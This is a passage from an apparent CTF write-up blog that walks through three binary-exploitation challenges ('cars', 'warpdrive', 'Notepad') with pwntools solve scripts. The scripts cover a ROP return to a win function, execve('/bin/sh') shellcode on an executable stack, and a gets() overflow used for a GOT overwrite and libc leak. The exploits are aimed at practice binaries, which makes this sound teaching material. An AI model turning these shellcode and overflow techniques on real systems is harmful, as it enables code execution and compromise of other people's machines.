</span></span></code></pre></div><p>As we can see, it crashes on a <code>movaps</code> instruction. If we look at the <code>movaps</code> instruction <a href=https://c9x.me/x86/html/file_module_x86_id_180.html>documentation</a>, it mentions</p><blockquote><p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated.</p></blockquote><p>In this context, the operand is <code>rsp + 0x10</code>. This means that our <code>rsp</code> register has to be 16-byte aligned, but it is not (<code>0x7ffd7586b648 % 0x10 != 0x0</code>) &ndash; resulting in the crash.</p><p>How can we fix this? We can simply add a single <code>ret</code> instruction to increment our <code>RSP</code> by 0x8 before we call <code>admin()</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ ROPgadget --binary cars <span class=p>|</span> grep <span class=s2>&#34; : ret</span>$<span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>0x000000000000101a : ret
</span></span></code></pre></div><p>Let&rsquo;s update our solve script.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># run the program</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./cars&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Report number: #&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>REPORT_NUMBER_ADDRESS</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>ELF_BASE</span> <span class=o>=</span> <span class=n>REPORT_NUMBER_ADDRESS</span> <span class=o>-</span> <span class=mh>0x4090</span>
</span></span><span class=line><span class=cl><span class=n>ADDRESS_OF_ADMIN</span> <span class=o>=</span> <span class=n>ELF_BASE</span> <span class=o>+</span> <span class=mh>0x128E</span>
</span></span><span class=line><span class=cl><span class=n>RET_GADGET</span> <span class=o>=</span> <span class=n>ELF_BASE</span> <span class=o>+</span> <span class=mh>0x101A</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Please input your Student ID:</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;id&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Please describe the incident: (vulnerable!!)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>40</span>  <span class=c1># pad our return address</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>RET_GADGET</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>ADDRESS_OF_ADMIN</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ python3 solve.py
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./cars&#39;</span>: pid <span class=m>1547936</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
</span></span><span class=line><span class=cl>Please input your student ID: Please describe the incident: The matter has been recorded and will be investigated. Thank you.
</span></span><span class=line><span class=cl>blahaj<span class=o>{</span>r0pp1n6_w17h_p13<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</span></span></code></pre></div><h2 id=warpdrive>warpdrive</h2><blockquote><p>with the latest and greatest in blahajtech, you can now warp anywhere on the stack!</p><p>Attachments: <a href=./attachments/pwn/warpdrive/warp>warp</a></p></blockquote><h3 id=analyzing-the-program-1>Analyzing the program</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ checksec warp
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;./warp&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Full RELRO
</span></span><span class=line><span class=cl>    Stack:    Canary found
</span></span><span class=line><span class=cl>    NX:       NX disabled
</span></span><span class=line><span class=cl>    PIE:      PIE enabled
</span></span><span class=line><span class=cl>    RWX:      Has RWX segments
</span></span></code></pre></div><p>We are not given with the source code. This means that we will have to throw it into a decompiler like IDA or ghidra.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=n>ptr</span><span class=p>)(</span><span class=kt>void</span><span class=p>);</span> <span class=c1>// [rsp+8h] [rbp-38h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>input</span><span class=p>[</span><span class=mi>40</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-30h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>canary</span><span class=p>;</span> <span class=c1>// [rsp+38h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>canary</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;CURRENT POSITION: %p</span><span class=se>\n</span><span class=s>WARP TO:&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fgets</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=mi>40</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_sscanf</span><span class=p>(</span><span class=n>input</span><span class=p>,</span> <span class=s>&#34;%p&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>ptr</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>As we can see, the program has <strong>No eXecute (NX)</strong> protections disabled, and has <strong>Read-Write-eXecute (RWX)</strong> segments.</p><p>This means that the stack is executable, which allows us to potentially put assembly code on the stack to be executed.</p><p>As we can see, the program prints us a stack address, takes in an address as an input and execute code at our inputted address.</p><h3 id=solving-the-challenge>Solving the challenge</h3><p>Trivially, with the NX protections disabled, we can simply put shellcode <em>(assembly code that gives us a shell)</em> on the stack, and then jump to it. We can do this using a <strong>sys_execve</strong> syscall.</p><p>Refer to this <a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>syscall table</a>, to see the arguments that we have to populate for a <strong>sys_execve</strong> syscall.</p><ul><li><strong>SYS_EXECVE</strong><ul><li><strong>RAX</strong>: 0x3b</li><li><strong>RDI</strong>: char* filename</li><li><strong>RSI</strong>: char* argv[]</li><li><strong>RDX</strong>: char* envp[]</li></ul></li></ul><p>Ultimately, we want to write assembly to do the following <code>sys_execve(0x3b, "/bin/sh", 0, 0)</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=c1># put our /bin/sh string on the stack</span>
</span></span><span class=line><span class=cl>mov rbx, 0x68732f6e69622f
</span></span><span class=line><span class=cl>push rbx
</span></span><span class=line><span class=cl><span class=c1># move /bin/sh pointer to RDI</span>
</span></span><span class=line><span class=cl>mov rdi, rsp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># populate argv and envp arguments</span>
</span></span><span class=line><span class=cl>xor esi, esi  <span class=c1># RSI = 0</span>
</span></span><span class=line><span class=cl>xor edx, edx  <span class=c1># RDX = 0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># make our execve syscall</span>
</span></span><span class=line><span class=cl>mov ax, 0x3b
</span></span><span class=line><span class=cl>syscall
</span></span></code></pre></div><p>Finally, we can put all this in a pwntools script and solve the challenge.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./warp&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rbx, 0x68732f6e69622f
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp
</span></span></span><span class=line><span class=cl><span class=s2>xor esi, esi
</span></span></span><span class=line><span class=cl><span class=s2>xor edx, edx
</span></span></span><span class=line><span class=cl><span class=s2>mov ax, 0x3b
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;POSITION: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>stack_leak</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>+</span> <span class=mi>15</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34; &#34;</span> <span class=o>+</span> <span class=n>sc</span><span class=p>)</span>  <span class=c1># 8+15 is padding to the shellcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ python3 solve.py
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./warp&#39;</span>: pid <span class=m>1555153</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
</span></span><span class=line><span class=cl>WARP TO:
</span></span><span class=line><span class=cl>$ cat flag.txt
</span></span><span class=line><span class=cl>blahaj<span class=o>{</span>a_w4Rp_Bl1P_<span class=p>&amp;</span>_A_jUmp<span class=o>}</span>
</span></span></code></pre></div><h2 id=notepad>Notepad</h2><blockquote><p>What kinda lousy notepad is this? Gonna go back to neovim&mldr;</p><p>Attachments: <a href=./attachments/pwn/notepad/notepad>notepad</a> <a href=./attachments/pwn/notepad/libc-2.31.so>libc</a></p></blockquote><h3 id=analyzing-the-program-2>Analyzing the program</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ checksec notepad
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;./notepad&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>➜ ./notepad
</span></span><span class=line><span class=cl>Enter your note:
</span></span><span class=line><span class=cl>hi
</span></span><span class=line><span class=cl>Received
</span></span><span class=line><span class=cl>thanksbb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>➜ ./notepad
</span></span><span class=line><span class=cl>Enter your note:
</span></span><span class=line><span class=cl>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span></span><span class=line><span class=cl>Received
</span></span><span class=line><span class=cl>Segmentation fault <span class=o>(</span>core dumped<span class=o>)</span>
</span></span></code></pre></div><p>If we try running the program, we see that it takes a single input and ends. If we try passing a long string in the input, it crashes. This tells us that this program might once again be vulnerable to a buffer overflow attack.</p><p>Let&rsquo;s have a deeper look at the program by throwing it into IDA.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=n>__noreturn</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>input</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-30h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>size</span><span class=p>;</span> <span class=c1>// [rsp+10h] [rbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>;</span> <span class=c1>// [rsp+18h] [rbp-18h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>void</span> <span class=o>*</span><span class=n>dest</span><span class=p>;</span> <span class=c1>// [rsp+20h] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>canary</span><span class=p>;</span> <span class=c1>// [rsp+28h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>canary</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setup</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>size</span> <span class=o>=</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>buf</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>strcpy</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=s>&#34;thanksbb&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>dest</span> <span class=o>=</span> <span class=n>input</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Enter your note: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Received&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memcpy</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>input</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This program is straightforward. Let&rsquo;s summarize it below</p><ol><li>Allocate a buffer on the heap of size 0x100.</li><li>Write the string &ldquo;thanksbb&rdquo; into the buffer</li><li>Read in an input using the <code>gets()</code> function</li><li>Print out the buffer, and then exit.</li></ol><h3 id=vulnerability-analysis>Vulnerability Analysis</h3><p>If we remember earlier on, the program crashed when passing in a big string. Why is that so?</p><p>If we look at the <a href=https://man7.org/linux/man-pages/man3/gets.3.html>man page for the gets() function</a>, we see the following:</p><blockquote><pre><code>   Never use gets().  Because it is impossible to tell without
   knowing the data in advance how many characters gets() will read,
   and because gets() will continue to store characters past the end
   of the buffer, it is extremely dangerous to use.  It has been
   used to break computer security.  Use fgets() instead.
</code></pre></blockquote><p>This means that the <code>gets()</code> function will read as many characters as you want, allowing for you to easily overflow the input buffer of size 16. This gives us a buffer overflow.</p><h3 id=exploiting-the-program-ret2libc>Exploiting the Program: ret2libc</h3><p>With our overflow, we can do a few things</p><ol><li>We are able to overwrite <code>dest</code> and <code>size</code> to write anywhere that we want.</li><li>We are able to overwrite <code>buf</code> pointer, allowing us to leak any memory address.</li></ol><p>Since there is no obvious <strong>win</strong> function, we will have to do employ a technique such as <a href=https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc>ret2libc</a>.</p><p>The first part of our ret2libc requires us to leak a <strong>libc</strong> address, which is randomized due to <a href=https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR>ASLR</a>. How can we do this?</p><p>Let&rsquo;s explore this concept known as the Global Offset Table (GOT).</p><h4 id=the-global-offset-table>The Global Offset Table</h4><p><img src=./attachments/pwn/notepad/got.PNG alt=image></p><p>When a binary attempts to call a library function <em>(i.e. printf)</em>, it will call printf in the <strong>procedure linkage table (PLT)</strong>, which basically contains some instructions that will jump to the address contained <strong>inside the printf entry in the GOT.</strong> (refer to above image).</p><p>What this means for us is that the <strong>GOT entries</strong> contains the corresponding addresses to the <strong>LIBC functions</strong> after the first call <em>(after it has been resolved by the dlruntime resolver)</em>. Furthermore if we can corrupt and of the GOT entries, we can redirect a call to <code>exit()</code> for example, to any other functions that we want.</p><h4 id=back-to-leaking>Back to leaking</h4><p>Since there is no <strong>Positional Independent Executable (PIE)</strong> protections enabled, the memory address that the ELF is loaded at is always constant, and as a result the GOT is also always at a constant address.</p><p>This means that if we overwrite the <strong>buf</strong> pointer on the stack to a GOT entry, when the program calls <code>puts(buf)</code>, it will leak the contents of the GOT entry. Furthermore, we can also overwrite the GOT entry for <code>exit()</code> to the <code>main()</code> function, we can also prevent the program from exiting and loop back to main instead for our subsequent payloads.</p><p>In summary, this is our first step of our exploit</p><ol><li>Overwrite <code>dest</code> to GOT entry for <code>exit</code>, and overwrite <code>size</code> be 8. We will write <code>main</code> address in <code>exit</code> GOT entry.</li><li>Overwrite <code>buf</code> to GOT entry for <code>puts</code>, leaking the libc address of <code>puts</code>.</li></ol><h4 id=stage-1-exploit>Stage 1 Exploit</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./notepad&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc.so.6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./notepad&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>fit</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>:</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>main</span><span class=p>,</span>  <span class=c1># what we want to write into exit GOT</span>
</span></span><span class=line><span class=cl>    <span class=mi>16</span><span class=p>:</span> <span class=mi>8</span><span class=p>,</span>            <span class=c1># size</span>
</span></span><span class=line><span class=cl>    <span class=mi>24</span><span class=p>:</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>,</span> <span class=c1># buf</span>
</span></span><span class=line><span class=cl>    <span class=mi>32</span><span class=p>:</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>exit</span>  <span class=c1># dest</span>
</span></span><span class=line><span class=cl><span class=p>}))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Received</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>unpack</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>(),</span> <span class=s2>&#34;all&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>leak</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>puts</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;puts @ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;libc base @ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ python3 solve.py
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;./notepad&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;./libc-2.31.so&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    Canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      PIE enabled
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./notepad&#39;</span>: pid <span class=m>1570328</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> puts @ 0x7f402b1c1e50
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> libc base @ 0x7f402b141000
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
</span></span><span class=line><span class=cl>Enter your note:
</span></span><span class=line><span class=cl>$
</span></span></code></pre></div><p>Success!</p><h3 id=getting-a-shell>Getting a shell</h3><p>Now that we have our libc address, we want to call <code>system("/bin/sh")</code>. In order to do this, we need both the address of the <code>/bin/sh</code> string and the <code>system</code> function.</p><p>We can overwrite the <code>puts</code> GOT entry to point to <code>system</code>, and then overwrite <code>buf</code> to be a pointer to <code>/bin/sh</code>, resulting in the program calling <code>system("/bin/sh")</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./notepad&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc.so.6&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./notepad&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>fit</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>:</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>main</span><span class=p>,</span>  <span class=c1># what we want to write into exit GOT</span>
</span></span><span class=line><span class=cl>    <span class=mi>16</span><span class=p>:</span> <span class=mi>8</span><span class=p>,</span>            <span class=c1># size of write</span>
</span></span><span class=line><span class=cl>    <span class=mi>24</span><span class=p>:</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>,</span> <span class=c1># argument to puts</span>
</span></span><span class=line><span class=cl>    <span class=mi>32</span><span class=p>:</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>exit</span>  <span class=c1># we will write into here</span>
</span></span><span class=line><span class=cl><span class=p>}))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Received</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>unpack</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>(),</span> <span class=s2>&#34;all&#34;</span><span class=p>)</span>
